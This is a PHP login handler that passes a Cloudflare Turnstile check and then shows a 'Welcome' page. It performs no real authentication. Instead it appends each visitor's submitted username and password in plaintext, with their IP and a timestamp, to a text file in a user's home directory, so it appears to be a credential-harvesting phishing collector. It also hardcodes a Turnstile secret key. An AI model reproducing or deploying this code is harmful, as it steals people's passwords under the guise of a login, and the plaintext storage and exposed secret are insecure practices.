<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = $_POST['cf-turnstile-response'] ?? '';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'secret' => '0x4AAAAAABlI9GDcRjMEL_2HtynYPPX323Q',
        'response' => $token,
        'remoteip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR']
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $verification = json_decode($response, true);

    if (!$verification['success']) {
        die("CAPTCHA failed. Please go back and try again.");
    }

    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['pswrd']);
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    $filePath = "/home/albert/logins.txt";
    if ($file = fopen($filePath, "a")) {
        fwrite($file, "[$timestamp][$ip] Username: $username, Password: $password\n");
        fclose($file);
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Welcome!</title>
    <link rel="stylesheet" href="namer.css" />
    <script src="login.js" defer></script>
</head>
<body>
    <h1>Welcome, <?php echo htmlspecialchars($username); ?>! 🎉</h1>
</body>
</html>
<?php
} else {
    echo "Invalid request.";
}
?>
